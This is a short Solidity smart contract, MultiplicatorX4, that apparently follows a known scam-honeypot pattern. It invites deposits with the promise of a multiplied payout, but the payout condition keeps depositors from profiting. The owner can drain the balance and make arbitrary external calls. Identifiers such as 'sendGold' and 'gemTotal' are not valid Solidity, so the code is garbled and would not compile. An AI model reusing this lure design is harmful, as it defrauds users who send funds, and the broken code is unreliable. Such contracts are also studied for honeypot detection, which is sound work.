// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public RealmLord = msg.sender;

    function() public payable{}

    function redeemGold()
    payable
    public
    {
        require(msg.sender == RealmLord);
        RealmLord.sendGold(this.gemTotal);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == RealmLord);
        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.gemTotal)
        {
            adr.sendGold(this.gemTotal+msg.value);
        }
    }
}